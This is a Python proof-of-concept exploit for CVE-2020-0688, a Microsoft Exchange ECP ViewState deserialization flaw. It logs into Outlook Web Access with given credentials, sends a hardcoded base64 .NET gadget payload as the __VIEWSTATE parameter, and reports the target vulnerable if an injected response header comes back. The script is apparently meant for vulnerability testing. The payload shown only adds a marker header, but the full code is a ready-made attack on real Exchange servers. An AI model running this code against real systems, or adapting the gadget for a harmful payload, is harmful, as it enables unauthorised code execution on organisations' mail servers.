#!/usr/bin/env python
import requests as req
import readline
import argparse
import re
import sys
import urllib3
from urllib.parse import urlparse
from urllib.parse import quote
from http.cookies import SimpleCookie
urllib3.disable_warnings()


def owa_login(url, user, pwd, timeout):
	login_url = url + '/owa/auth.owa'
	version = get_owa_version(login_url)
	if not version or int(version)<15:
		print("[-] Not supported Exchange version, exit...")
		return False
	print("[*] Tring to login owa...")
	paramsPost = '''password={}&isUtf8=1&passwordText=&trusted=4&destination={}&flags=4&forcedownlevel=0&username={}'''.format(pwd, url, user)
	headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0","Content-Type": "application/x-www-form-urlencoded"}
	cookies = {"PBack": "0", "PrivateComputer": "true"}
	print("[+] Login url: {}".format(url))
	try:
		resp = session.post(login_url, data=paramsPost,
                  headers=headers, cookies=cookies, verify=False ,timeout=timeout)
		print("[*] Status code:   %i" % resp.status_code)
		if "reason=" in resp.text:
			print("[!] Login Incorrect, please try again with a different account..")
			return False
	except Exception as e:
		print("[!] login error , error: {}".format(e))
		return False
	return True


def buildnumber_to_version(BuildNumber):
	#Reference:https://docs.microsoft.com/en-us/Exchange/new-features/build-numbers-and-release-dates?redirectedfrom=MSDN&view=exchserver-2019
	strlist = BuildNumber.split('.')
	return strlist[0]

def get_owa_version(url):
	try:
		r = req.get(url, verify=False)
		nPos1 = r.text.index('href="')
		str1 = r.text[nPos1+9:nPos1+40]
		nPos2 = str1.index('/')
		nPos3 = str1.index('/themes/')
		str2 = str1[nPos2:nPos3]
		nPos4 = str2.rindex('/')
		BuildNumber = str2[nPos4+1:]
		print('[+] Get build number:%s' % (BuildNumber))
		result = buildnumber_to_version(BuildNumber)
	except Exception as e:
		print('[!] Error in get exchagne version, exit.. error is :%s' % e)
		return False
	
	return result


def main():
	parser = argparse.ArgumentParser()
	parser.add_argument("-s", "--server", required=True,
						help="ECP Server URL Example: http://ip/owa")
	parser.add_argument("-u", "--user", required=True,
						help="login account Example: domain\\user")
	parser.add_argument("-p", "--password", required=True, help="Password")
	parser.add_argument(
		"-t", "--timeout", help="Timeout", default='30')
	args = parser.parse_args()
	url = args.server
	tmp = urlparse(url)
	domain = tmp.netloc
	base_url = "{}://{}".format(tmp.scheme, tmp.netloc)
	print("[*] Start to exploit..")
	user = args.user
	pwd = args.password
	timeout = int(args.timeout)
	login = owa_login(base_url, user, pwd, timeout)
	if not login:
		return
	# from https://github.com/zcgonvh/CVE-2020-0688
	out_payload = "/wEymAkAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAC6BzxSZXNvdXJjZURpY3Rpb25hcnkgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiIHhtbG5zOnM9ImNsci1uYW1lc3BhY2U6U3lzdGVtO2Fzc2VtYmx5PW1zY29ybGliIiB4bWxuczp3PSJjbHItbmFtZXNwYWNlOlN5c3RlbS5XZWI7YXNzZW1ibHk9U3lzdGVtLldlYiI+PE9iamVjdERhdGFQcm92aWRlciB4OktleT0iYSIgT2JqZWN0SW5zdGFuY2U9Int4OlN0YXRpYyB3Okh0dHBDb250ZXh0LkN1cnJlbnR9IiBNZXRob2ROYW1lPSIiPjwvT2JqZWN0RGF0YVByb3ZpZGVyPjxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9ImIiIE9iamVjdEluc3RhbmNlPSJ7U3RhdGljUmVzb3VyY2UgYX0iIE1ldGhvZE5hbWU9ImdldF9SZXNwb25zZSI+PC9PYmplY3REYXRhUHJvdmlkZXI+PE9iamVjdERhdGFQcm92aWRlciB4OktleT0iYyIgT2JqZWN0SW5zdGFuY2U9IntTdGF0aWNSZXNvdXJjZSBifSIgTWV0aG9kTmFtZT0iZ2V0X0hlYWRlcnMiPjwvT2JqZWN0RGF0YVByb3ZpZGVyPjxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9ImQiIE9iamVjdEluc3RhbmNlPSJ7U3RhdGljUmVzb3VyY2UgY30iIE1ldGhvZE5hbWU9IkFkZCI+PE9iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPjxzOlN0cmluZz5YLVpDRy1URVNUPC9zOlN0cmluZz48czpTdHJpbmc+Q1ZFLTIwMjAtMDY4ODwvczpTdHJpbmc+PC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz48L09iamVjdERhdGFQcm92aWRlcj48T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJlIiBPYmplY3RJbnN0YW5jZT0ie1N0YXRpY1Jlc291cmNlIGJ9IiBNZXRob2ROYW1lPSJFbmQiPjwvT2JqZWN0RGF0YVByb3ZpZGVyPjwvUmVzb3VyY2VEaWN0aW9uYXJ5PguiWEsRz0bNLTCuxZ4yOnVoyZanTg=="
	final_exp = "{}/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&__VIEWSTATE={}".format(base_url, quote(out_payload))
	print("[*] Trigger payload..")
	#proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
	print("[*] Reset cookie ASP.NET_SessionId to null")
	session.cookies.set("ASP.NET_SessionId", "", domain=domain, path="/")
	resp = session.get(final_exp, verify=False, timeout=timeout,allow_redirects=False)
	if "X-ZCG-TEST" in resp.headers:
		print("\n[+] Pwn ! Target {}  was vulnerable !".format(url))
	else:
		print("\n[!] No vulnerable found.")
		
session = req.Session()
if __name__ == "__main__":
	main()
